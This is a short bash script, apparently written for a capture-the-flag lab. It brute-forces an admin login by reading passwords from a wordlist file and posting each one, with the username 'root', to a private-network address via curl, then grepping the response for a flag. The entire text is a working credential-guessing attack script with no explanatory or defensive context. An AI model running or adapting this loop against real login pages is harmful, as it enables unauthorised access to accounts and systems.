while IFS='' read -r line || [[ -n "$line" ]]; do
	    echo "Password: $line \n";
		curl -d "username=root&password=$line&Login=Login" --dump-header headers http://192.168.100.129/admin/ | grep flag
done < "$1"
